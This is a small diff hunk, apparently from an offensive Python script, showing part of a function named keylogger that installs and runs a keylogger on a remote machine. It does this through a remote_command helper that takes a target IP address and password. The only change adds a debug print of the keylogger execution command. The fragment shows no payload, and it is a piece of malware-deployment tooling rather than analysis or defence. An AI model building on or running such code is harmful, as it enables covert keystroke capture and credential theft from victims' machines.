@@ -124,6 +124,7 @@ def keylogger(ipv4,pword,temp_path,startup_path):
     remote_command(ipv4,pword,controller_command)
     print("[*] keylogger installed successfully")
     print("\n[+] Executing keylogger...\n")
+    print(execute_keylogger)
     remote_command(ipv4,pword,execute_keylogger)
     print("[*] Keylogger executed successfully...")
 
